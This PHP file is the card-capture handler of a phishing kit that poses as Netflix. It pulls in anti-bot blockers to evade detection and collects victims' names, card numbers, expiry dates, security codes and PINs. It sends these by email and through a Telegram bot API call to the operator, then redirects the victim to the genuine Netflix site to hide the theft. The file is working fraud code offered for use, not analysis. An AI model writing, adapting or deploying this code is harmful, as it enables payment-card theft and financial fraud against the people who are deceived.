<?php
/*
      PRIV8 SCAMP4GE BY XFORGEX CODER

*/
session_start();
error_reporting(0);
# Adding Settings
include('functions.php');
include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');
include('../Antibot/blockers.php');
include('../Antibot/detects.php');
/////
$settings = include('config.php');
# User Agent 

$useragent = $_SERVER['HTTP_USER_AGENT'];

$required = array('creditCardNumber', 'firstName');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  header('Location: ../login.php');
} else {

#
$_SESSION["creditCardNumber"] = $_POST['creditCardNumber'];
$_SESSION["firstName"] = $_POST['firstName'];
# Logs
#$subject .= "💰💰==== N3TFLIX CARD FROM {$IP} ====💰💰\n\n";


$msgtg = '
💰💰==== N3TFLIX CARD FROM {'.$IP.'} ====💰💰

*👤First name  * : `'.$_POST['firstName'].'`
*👤Last name   * : `'.$_POST['lastName'].'`
*👤Card Number * : `'.$_POST['creditCardNumber'].'`
*👤Expiry Month  * : `'.$_POST['creditExpirationMonth'].'`
*👤Csv    * : `'.$_POST['creditCardSecurityCode'].'`
*👤Pin    * : `'.$_POST['pin'].'`

*=========[ DEVICE INFO ]=========*
*IP* : http://www.geoiptool.com/?IP='.$IP.'
*Date* : '.$date.'
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';

#Send To Telegram
if ($settings['send_mail'] == "1"){
  $to = $settings['email'];
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: xforgex <netflix@client_site.com>\r\n";
  $subject = "✦ N3TFLIX CARD FROM ✦ {$IP} ✦";
  $msg = $msgtg;
  mail($to, $subject, $msg, $headers);
   }

 # Send Bot

if ($settings['telegram'] == "1"){
  $data = $msgtg;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/bot{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  }


header('Location: https://www.netflix.com');
}
?>